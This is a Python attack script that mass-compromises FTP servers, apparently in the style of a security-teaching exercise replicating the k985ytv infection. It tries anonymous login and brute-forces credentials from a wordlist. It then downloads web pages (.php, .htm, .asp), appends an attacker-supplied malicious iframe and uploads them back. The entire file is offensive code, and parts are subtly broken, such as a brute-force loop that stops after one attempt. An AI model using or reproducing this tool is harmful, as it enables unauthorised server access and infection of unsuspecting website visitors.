#!/usr/bin/python3

"""
FTP Mass Compromise replication of k985ytv infection
Final Module - putting all things together
"""

import optparse
import ftplib
import time

def anonLogin(host):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user="Anonymous",passwd=" ")
        print("[+] Anonymous Login succeeded !")
        print("Host : "+host)
        ftp.quit()
        return True
    except:
        print("[+] Anonymous Login failed ")
        return False


def bruteLogin(host,passfile):
    global Creds
    with open(passfile,'r') as pF:
        for line in pF.readlines():
            time.sleep(1)
            user   = line.split(':')[0]
            passwd = line.split(':')[1].strip('\r').strip('\n')
            print("[*] Trying "+line)
            try:
                ftp = ftplib.FTP(host)
                ftp.login(user,passwd)
                print("[+] Login Succeeded ==> "+host+":"+user+"/"+passwd)
                ftp.quit()
                return (user,passwd)
            except:
                pass
            print("[-] Wordlist exhausted ")
            return (None,None)


def retDefault(ftp):
    try:
        lisDir = ftp.nlst()
    except:
        print("[-] Couldn't list directory contents")
        print("[-] Skipping...")
        return
    retDir = []
    for files in lisDir:
        names = files.lower()
        if( '.php' in names or '.htm' in names or '.asp' in names ):
            retDir.append(files)
            print("[+] Found a WebPage : "+files)
    return retDir


def injectPage( ftp, page, redirect ):
    with open(page+'.tmp','w') as f:
        ftp.retrlines( 'RETR ' + page , f.write )
        print("[+] Downloaded page : " + page)
        f.write(redirect)
    
    print("[+] Injected Malicious IFrame on : " + page)
    ftp.storlines('STOR ' + page,open(page+'.tmp'))
    print("[+] Successfully Uploaded the Injected Page : " + page)


def attack( user, passwd, host, redirect ):
    ftp = ftplib.FTP(host)
    ftp.login(user,passwd)
    
    defPages = retDefault(ftp)
    
    for defPage in defPages:
        injectPage( ftp, defPage, redirect )


def main():
    parser = optparse.OptionParser(usage = "Usage : ./FTPInfect.py -H <target host[s]> -r <injection string> [-f <dictionary>]")
    parser.add_option("-H", dest = 'host', type = str, help = "Target(s) to attack seperated by comma")
    parser.add_option("-r", dest = 'redirect', type = str, help = "Exploit String to inject into the webpage")
    parser.add_option("-f", dest = 'passfile', type = str, help = "Dictionary for bruteforce in format user:pass")
    options,args = parser.parse_args()
    
    hosts      = options.host.split(',')
    passwdfile = options.passfile
    redirect   = options.redirect
    
    if( hosts == None or redirect == None ):
        print(parser.usage())
        exit(0)
    
    for tgthost in hosts:
        username = ""
        password = ""
        
        if( anonLogin(tgthost) == True ):
            username = "anonymous"
            password = " "
            print("[+] Using Anonymous login to attack ")
            attack( username, password, tgthost, redirect )
        elif( passwdfile != None ):
            (username,password) = bruteLogin( tgthost, passwdfile )
            if( password != None ):
                print("[+] Using Creds ==> " + username +":" + password)
                attack( username, password, tgthost, redirect )


if( __name__ == "__main__" ):
    main()
